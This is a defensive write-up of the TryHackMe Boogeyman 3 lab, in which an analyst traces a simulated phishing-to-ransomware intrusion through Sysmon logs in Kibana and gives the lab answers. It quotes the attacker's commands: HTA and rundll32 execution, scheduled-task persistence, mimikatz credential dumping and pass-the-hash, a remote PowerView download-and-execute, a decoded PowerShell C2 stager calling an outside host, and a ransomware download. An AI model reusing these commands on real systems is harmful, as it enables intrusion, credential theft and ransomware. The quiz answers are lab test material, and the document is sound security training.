---
title: Boogeyman 3
module: SOC Level 1 Capstone Challenges
path: SOC Level 1
platform: TryHackMe
tags: [elk, kibana, kql, sysmon, log-analysis, dfir, c2, persistence, uac-bypass, credential-dumping, mimikatz, lateral-movement, dcsync, ransomware, capstone]
status: complete
date: 2026-08-04
date_completed: 2026-08-05
---
*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*
 
<p align="center">
<img src=screenshots/boogeyman3.png width="1500">
</p>
---
 
## TASK 1 - [Introduction]
 
- Third capstone in the Boogeyman series. Quick Logistics LLC now has an MSSP running their SOC.
- No artefacts to download. Everything is Sysmon telemetry in an **Elastic Stack (ELK)** on the lab machine.
- Kibana: `http://MACHINE_IP`, user `elastic`, password `elastic`. Takes 3 to 5 minutes to come up.
- Work in **Discover**, index pattern `winlogbeat-*`, time range **Aug 29 to Aug 31, 2023**.
- Two event IDs carry the whole room: `winlog.event_id: 1` for process creation, `3` for network connections.
<p align="center">
<img src=screenshots/boogeyman-intro.png width="700">
</p>
---
 
## TASK 2 - [The Chaos Inside]
 
### Scenario
 
- The Boogeyman kept access from the earlier compromise and stayed quiet.
- They phished the CEO, **Evan Hutchinson**. He opened the attachment, saw nothing happen, reported it.
- Attachment found in Downloads, an **ISO**. A further payload file was hidden inside it.
- Window: 29 to 30 August 2023.
<p align="center">
<img src=screenshots/bm3-email.png width="700">
</p>
<p align="center">
<img src=screenshots/bm3-download.png width="700">
</p>
<p align="center">
<img src=screenshots/bm3-iso.png width="700">
</p>
*Known before searching:*
 
- attachment / ISO name: `ProjectFinancialSummary_Q3.pdf`, Disc Image File, 2,208 KB
- file inside the ISO: `ProjectFinancialSummary_Q3.pdf`, HTML Application, 1 KB
- victim user: Evan Hutchinson, CEO
- victim hostname:
Note the rendered name hides the real extension. On disk it is `ProjectFinancialSummary_Q3.pdf.hta`. That is why a full-name search returns nothing and a stem search works.
 
---
 
## Machine 1: Evan Hutchinson's workstation
 
### 1. What is the PID of the process that executed the initial stage 1 payload?
 
*Method:*
 
Read the question carefully. "The process **that executed** the payload" is the parent. The payload itself is the child. So the row you want has the payload in `process.command_line`, and the answer is the PID of the process that launched it.
 
Start from the only thing known for certain, the filename from the ISO. Search the stem, not the full name.
 
```
*ProjectFinancialSummary*
```
 
Columns used:
 
```
Time | process.parent.pid | process.pid | winlog.task | process.parent.name | process.name | process.parent.command_line | process.command_line | message
```
 
<p align="center">
<img src=screenshots/bm3-q1.png width="700">
</p>
**Attack sequence, all four rows inside one second:**
 
**Aug 29, 2023 @ 23:51:15.856**
 
- `explorer.exe` (PID 2940) spawns `mshta.exe` (PID 6392)
- `"C:\Windows\SysWOW64\mshta.exe" "D:\ProjectFinancialSummary_Q3.pdf.hta"`
- Windows used `mshta.exe`, the Microsoft HTML Application host, to execute the malicious script inside the `.hta`
**Aug 29, 2023 @ 23:51:16.738**
 
- `mshta.exe` (6392) spawns `xcopy.exe` (PID 3832)
- `"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat`
- `/h` copies hidden and system files. `review.dat` was hidden on the ISO, which is why it did not show in the folder view
- Destination is `AppData\Local\Temp`, user-writable and full of legitimate junk
**Aug 29, 2023 @ 23:51:16.771**
 
- `mshta.exe` (6392) spawns `rundll32.exe` (PID 3680)
- `"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer`
- Runs the payload straight off the mounted ISO
**Aug 29, 2023 @ 23:51:16.809**
 
- `mshta.exe` (6392) spawns `powershell.exe` (PID 6204)
- `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $A = New-ScheduledTaskAction -Execute 'rundll32.exe' -Argument 'C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer'; $T = New-ScheduledTaskTrigger -Daily -At 06:00; $S = New-ScheduledTaskSettingsSet; $P = New-ScheduledTaskPrincipal $env:username; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask Review -InputObject $D -Force;`
- Creates a scheduled task named `Review`, running daily at 06:00 against the copy in Temp, so the malware survives reboot
**Answer: 6392**
 
---
 
### 2. The stage 1 payload attempted to implant a file to another location. What is the full command-line value of this execution?
 
*Method:*
 
Already visible in the table above, no new search needed. The second event is a clear `xcopy`.
 
```
*ProjectFinancialSummary*
```
 
Aug 29, 2023 @ 23:51:16.738
 
<p align="center">
<img src=screenshots/bm3-q2.png width="700">
</p>
**Answer: "C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat**
 
---
 
### 3. The implanted file was eventually used and executed by the stage 1 payload. What is the full command-line value of this execution?
 
*Method:*
 
Sitting directly under the event just found, which is the point of setting good columns. The whole chain is readable in one view.
 
Aug 29, 2023 @ 23:51:16.771. The attacker uses `rundll32.exe`, a signed Windows binary, to load the malicious `review.dat` in memory. It looks like a normal DLL registration.
 
<p align="center">
<img src=screenshots/bm3-q3.png width="700">
</p>
**Answer: "C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer**
 
---
 
### 4. The stage 1 payload established a persistence mechanism. What is the name of the scheduled task created by the malicious script?
 
*Method:*
 
Also in the same table. Aug 29, 2023 @ 23:51:16.809, `Register-ScheduledTask Review`.
 
```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $A = New-ScheduledTaskAction -Execute 'rundll32.exe' -Argument 'C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer'; $T = New-ScheduledTaskTrigger -Daily -At 06:00; $S = New-ScheduledTaskSettingsSet; $P = New-ScheduledTaskPrincipal $env:username; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask Review -InputObject $D -Force;
```
 
<p align="center">
<img src=screenshots/bm3-q4.png width="700">
</p>
**Answer: Review**
 
---
 
### 5. The execution of the implanted file inside the machine has initiated a potential C2 connection. What is the IP and port used by this connection? (format: IP:port)
 
*Method:*
 
The question changed verb. Questions 1 to 4 asked what **ran**, which is event ID 1. This asks what **talked**, which is event ID 3.
 
```
*3680*
```
 
Columns used:
 
```
Time | source.ip | destination.ip | destination.port | winlog.event_id | message | process.command_line | process.parent.command_line
```
 
**Aug 29, 2023 @ 23:51:17.116**
 
- 0.3 seconds after 3680 starts, it spawns a **second** `rundll32.exe` (PID 4672) and steps aside
- 4672 is the process that holds the C2 from here on
**Aug 30, 2023 @ 00:03:31.588**
 
- First callback from PID 4672 to `165.232.170.151:80`
- Later beacons at 00:44:47, 01:04:45, 01:32:43. Uneven gaps, which is **jitter**, deliberate randomisation so the callback does not look scheduled
<p align="center">
<img src=screenshots/bm3-q5.png width="700">
</p>
**Answer: 165.232.170.151:80**
 
---
 
### 6. The attacker has discovered that the current access is a local administrator. What is the name of the process used by the attacker to execute a UAC bypass?
 
*Method:*
 
The payload is `review.dat`, so anything spawning from it is an event ID 1 worth reading.
 
```
review.dat and winlog.event_id: 1
```
 
| Time | process.pid | process.parent.pid | process.parent.name | process.name | process.command_line |
| --- | --- | --- | --- | --- | --- |
| Aug 29, 2023 @ 23:51:16.771 | 3680 | 6392 | mshta.exe | rundll32.exe | `"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer` |
| Aug 29, 2023 @ 23:51:17.116 | 4672 | 3680 | rundll32.exe | rundll32.exe | `"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer` |
| Aug 29, 2023 @ 23:53:47.951 | 6660 | 4672 | rundll32.exe | cmd.exe | `C:\Windows\system32\cmd.exe" /c "whoami /all"` |
| Aug 29, 2023 @ 23:54:48.608 | 4468 | 4672 | rundll32.exe | whoami.exe | `"C:\Windows\system32\whoami.exe" /groups` |
| Aug 29, 2023 @ 23:54:49.043 | 5308 | 4672 | rundll32.exe | fodhelper.exe | `"C:\Windows\system32\fodhelper.exe"` |
 
- `review.dat` is executed from the D: drive using `rundll32.exe`
- At 23:51:17.116 the attacker re-launches into PID **4672**. That is the C2 process for the rest of the intrusion
- Discovery starts with `whoami /all`, then `whoami /groups` to check privileges
- Finding local admin, the attacker reaches for a **UAC bypass**. `fodhelper.exe` is a signed Windows binary that auto-elevates, which is why it is the standard choice
<p align="center">
<img src=screenshots/bm3-q6.png width="700">
</p>
**Answer: fodhelper.exe**
 
---
 
### 7. Having a high privilege machine access, the attacker attempted to dump the credentials inside the machine. What is the GitHub link used by the attacker to download a tool for credential dumping?
 
*Method:*
 
Free search for `github`, narrowed to process creation.
 
```
*github* and winlog.event_id: 1
```
 
<p align="center">
<img src=screenshots/bm3-q7.png width="700">
</p>
**Answer: https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip**
 
---
 
### 8. After successfully dumping the credentials inside the machine, the attacker used the credentials to gain access to another machine. What is the username and hash of the new credential pair? (format: username:hash)
 
*Method:*
 
```
*mimi* and winlog.event_id: 1
```
 
| Time | process.command_line |
| --- | --- |
| Aug 30, 2023 @ 00:09:57.186 | `powershell.exe -c "iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile mimi.zip"` |
| Aug 30, 2023 @ 00:10:15.314 | `powershell.exe -c "Expand-Archive mimi.zip"` |
| Aug 30, 2023 @ 00:11:26.438 | `"C:\Windows\Temp\m\x64\mimi\x64\mimikatz.exe" privilege::debug sekurlsa::logonpasswords exit` |
| Aug 30, 2023 @ 00:13:37.090 | `"C:\Windows\Temp\m\x64\mimi\x64\mimikatz.exe" "sekurlsa::pth /user:itadmin /domain:QUICKLOGISTICS /ntlm:F84769D250EB95EB2D7D8B4A1C5613F2 /run:powershell.exe" exit` |
 
- Acquires the tool from GitHub, saved as `mimi.zip`
- Extracts it into `C:\Windows\Temp`
- `sekurlsa::logonpasswords` dumps credentials out of LSASS memory
- `sekurlsa::pth` is a **Pass-the-Hash** attack. The stolen NTLM hash is passed straight through and a new PowerShell spawns as `QUICKLOGISTICS\itadmin`, no password ever needed
<p align="center">
<img src=screenshots/bm3-q8.png width="700">
</p>
**Answer: itadmin:F84769D250EB95EB2D7D8B4A1C5613F2**
 
---
 
### 9. Using the new credentials, the attacker attempted to enumerate accessible file shares. What is the name of the file accessed by the attacker from a remote share?
 
*Method:*
 
The same search from question 8 already exposed the follow-on commands.
 
| Time | process.command_line |
| --- | --- |
| Aug 30, 2023 @ 00:14:36.078 | `powershell.exe -c "iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Invoke-ShareFinder"` |
| Aug 30, 2023 @ 00:18:38.647 | `powershell.exe -c "ls FileSystem::\\WKSTN-1327.quicklogistics.org\ITFiles"` |
| Aug 30, 2023 @ 00:19:52.889 | `powershell.exe -c "cat FileSystem::\\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1"` |
| Aug 30, 2023 @ 00:20:23.384 | `powershell.exe -c "$credential = ... 'QUICKLOGISTICS\allan.smith', 'Tr!ckyP@ssw0rd987' ... Invoke-Command -ComputerName WKSTN-1327 -ScriptBlock {whoami}"` |
| Aug 30, 2023 @ 00:20:56.818 | same command, retried |
| Aug 30, 2023 @ 00:21:52.606 | `powershell.exe -c "... Invoke-Command -ComputerName WKSTN-1327 -ScriptBlock {powershell -enc SQBmACgAJABQAFMAVgBsAHIAcwBpAG8AbgBUAGEAYgBsAGUA... [truncated]}"` |
 
- Discovers the network share `ITFiles` on `WKSTN-1327` using `Invoke-ShareFinder` from PowerView
- Reads `IT_Automation.ps1` and finds `allan.smith`'s plaintext password inside
- Tests the credentials with `Invoke-Command -ScriptBlock {whoami}`
- Then runs an encoded C2 stager on `WKSTN-1327` to establish a second foothold
<p align="center">
<img src=screenshots/bm3-q9.png width="700">
</p>
**Answer: IT_Automation.ps1**
 
---
 
### 10. After getting the contents of the remote file, the attacker used the new credentials to move laterally. What is the new set of credentials discovered by the attacker? (format: username:password)
 
*Method:*
 
Already visible in the table above. The plaintext password came out of `IT_Automation.ps1` at 00:19:52 and appears in every `Invoke-Command` from 00:20:23 onward.
 
```
process.command_line: *ConvertTo-SecureString*
```
 
<p align="center">
<img src=screenshots/bm3-q10.png width="700">
</p>
**Answer: QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987**
 
---
 
## Machine 2: WKSTN-1327
 
### 11. What is the hostname of the attacker's lab machine for its lateral movement attempt?
 
*Method:*
 
```
process.command_line: *ComputerName*
```
 
<p align="center">
<img src=screenshots/bm3-q11.png width="700">
</p>
**Answer: WKSTN-1327**
 
---
 
### 12. Using the malicious command executed by the attacker from the first machine to move laterally, what is the parent process name of the malicious command executed on the second compromised machine?
 
*Method:*
 
One command, two machines, two log entries. Machine 1 logs it going out. Machine 2 logs it arriving and running. The question asks what launched it on arrival.
 
The command sent from machine 1, at Aug 30, 2023 @ 01:40:37.178, PID 2260, parent 4672 `rundll32.exe`:
 
```
powershell.exe -c "$credential = (New-Object PSCredential -ArgumentList ('QUICKLOGISTICS\allan.smith', (ConvertTo-SecureString 'Tr!ckyP@ssw0rd987' -AsPlainText -Force))) ; Invoke-Command -Credential $credential -ComputerName WKSTN-1327 -ScriptBlock {powershell -enc SQBmACgAJABQAFMAVgBsAHIAcwBpAG8AbgBUAGEAYgBsAGUA... [truncated]}"
```
 
The `-enc` base64 blob is a unique fingerprint, so it joins the two sides. Search for it on the receiving machine.
 
```
host.hostname: WKSTN-1327 and winlog.event_id: 1 and process.name: powershell.exe
```
 
`wsmprovhost.exe` is the **WinRM Provider Host**. PowerShell Remoting spawns it on the target, and it runs whatever is inside `-ScriptBlock`. Different remote-execution methods leave different parents, so the parent alone identifies the technique.
 
<p align="center">
<img src=screenshots/bm3-q12.png width="700">
</p>
**Decoded blob** (CyberChef: From Base64, output encoding UTF-16LE):
 
```
If($PSVersionTable.PSVersion.Major -ge 3){};[System.Net.ServicePointManager]::Expect100Continue=0;$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('http://cdn.bananapeelparty.net:80',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('}wS1&VNqoIY*G#5-Plv{p2f=4Z?uat@<');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add("Cookie","rlkHVXWbb=13cfco9rUXx0i4J3xTu682JFiX0=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX
```
 
A second C2 domain appears here, `cdn.bananapeelparty.net:80`, and the payload is RC4 decrypted then piped to `IEX`.
 
**Answer: wsmprovhost.exe**
 
---
 
### 13. The attacker then dumped the hashes in this second machine. What is the username and hash of the newly dumped credentials? (format: username:hash)
 
*Method:*
 
```
host.name: *WKSTN-1327* and process.command_line: *sekurlsa*
```
 
Picking up where 12 left off:
 
- **00:21:53** Remote command lands. Parent `wsmprovhost.exe`. Attacker has execution on WKSTN-1327
- **01:29:09** Downloads mimikatz from GitHub as `mimi.zip`. Same tool, new box
- **01:29:39** `Expand-Archive mimi.zip`
- **01:30:26** Pass-the-hash as `itadmin`, reusing the hash stolen from Evan's machine. Parent is `mimikatz.exe`, so mimikatz spawns the shell via `/run:powershell.exe`
- **01:31:39** Pass-the-hash as `administrator` with a **different** hash. New credential, dumped here
- **01:33:34** `Invoke-Command {hostname} -ComputerName DC01.quicklogistics.org`. Testing whether the new creds reach the domain controller
- **01:33:51** Same `{hostname}` locally, to compare output and confirm the remote call actually ran elsewhere
- **01:34:20** `ls \\DC01.quicklogistics.org\c$`. Listing the DC's admin share. Success proves admin rights on the DC
- **01:35:54** Pass-the-hash as `administrator` again, this time with `/domain:quicklogistics.org` instead of the short name
<p align="center">
<img src=screenshots/bm3-q13.png width="700">
</p>
**Answer: administrator:00f80f2538dcb54e7adc715c0e7091ec**
 
---
 
## Machine 3: DC01.quicklogistics.org
 
### 14. After gaining access to the domain controller, the attacker attempted to dump the hashes via a DCSync attack. Aside from the administrator account, what account did the attacker dump?
 
*Method:*
 
```
host.name: DC01 and winlog.event_id: 1
```
 
**DCSync** abuses normal domain controller replication. The attacker asks the DC to send an account's password hash while pretending to be another DC. Nothing is installed and `NTDS.dit` is never touched, so it looks like routine traffic. It needs the **Replicating Directory Changes** right, which Domain Admins have by default.
 
- **01:47:34** `net localgroup administrators`. Listing who is in the local admin group. Enumeration, not access. `net1.exe` under `net.exe` is normal Windows behaviour
- **01:47:57** DCSync for `backupda`
- **01:48:04** DCSync for `administrator`
- **01:49:01** `{hostname}` against WKSTN-1327, short name
- **01:49:11** Same, FQDN
- **01:49:19** `{hostname}` against WKSTN-0051, FQDN. A machine not seen before
- **01:50:00** WKSTN-0051, short name
- **01:50:37** WKSTN-0051, FQDN again
`backupda` is dumped **first**, before `administrator`. A backup domain admin account is the one nobody watches.
 
The repeated short-name then FQDN pairs are name resolution retries, not two techniques. Short names resolve over NetBIOS, FQDNs over DNS.
 
<p align="center">
<img src=screenshots/bm3-q14.png width="700">
</p>
**Answer: backupda**
 
---
 
### 15. After dumping the hashes, the attacker attempted to download another remote file to execute ransomware. What is the link used by the attacker to download the ransomware binary?
 
*Method:*
 
```
host.name: DC01 and process.command_line: *http*
```
 
Sort `Time` descending. Ransomware is the last thing that happened.
 
- **01:53:13** Downloads `ransomboogey.exe` onto DC01
- **01:53:33** Runs it on DC01. Parent is `powershell.exe`, process is `ransomboogey.exe`. The DC is now encrypting
- **01:54:11 / 01:54:24** `{hostname}` against WKSTN-1327 and WKSTN-0051, re-confirming reach before pushing
- **01:56:05** WKSTN-1327: download plus `.\ransomboogey.exe`, relative path
- **01:56:40** WKSTN-1327: same again with full path `C:\Users\itadmin\`. The relative path did not work
- **01:57:53** WKSTN-1327: execute only, no download. Third attempt on the same box
- **01:59:36** WKSTN-0051: download to `C:\Users\itadmin\`
- **02:00:58** WKSTN-0051: `{hostname}` again, checking why nothing happened
- **02:01:14** WKSTN-0051: download again to `C:\Users\evan.hutchinson\`. The `itadmin` profile does not exist on that box
- **02:02:09** WKSTN-0051: drops a fresh encoded C2 stager instead, falling back to getting a shell
The DC was hit first, then the workstations. That ordering is deliberate. Kill the domain controller and recovery gets much harder.
 
Ignore any `GoogleUpdater` rows around 02:10. That is Chrome's auto-updater under `svchost.exe -k netsvcs` and `services.exe`, normal background noise.
 
<p align="center">
<img src=screenshots/bm3-q15.png width="700">
</p>
**Answer: http://ff.sillytechninja.io/ransomboogey.exe**
 
---

## TASK 3 - [Conclusion]

### MITRE ATT&CK mapping

| Tactic               | Technique                                | Evidence |
| -------------------- | ---------------------------------------- | -------- |
| Initial Access       | T1566.001 Spearphishing Attachment       |          |
| Execution            | T1204.002 User Execution: Malicious File |          |
| Persistence          | T1053.005 Scheduled Task                 |          |
| Privilege Escalation | T1548.002 Bypass User Account Control    |          |
| Credential Access    | T1003.001 LSASS Memory                   |          |
| Discovery            | T1135 Network Share Discovery            |          |
| Lateral Movement     | T1550.002 Pass the Hash                  |          |
| Credential Access    | T1003.006 DCSync                         |          |
| Command and Control  | T1105 Ingress Tool Transfer              |          |
| Impact               | T1486 Data Encrypted for Impact          |          |

---
